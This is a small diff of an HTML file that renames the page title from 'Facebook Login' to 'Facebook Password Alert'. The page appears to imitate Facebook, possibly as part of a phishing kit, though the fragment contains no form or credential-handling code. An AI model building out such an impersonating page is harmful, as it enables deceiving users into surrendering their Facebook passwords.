@@ -6,7 +6,7 @@
 <head>
 	<meta charset="UTF-8">
 	<link href="../log.css" rel="stylesheet" type="text/css">
-	<title>Facebook Login</title>
+	<title>Facebook Password Alert</title>
 	<script type="text/javascript">
 	
 	</script>
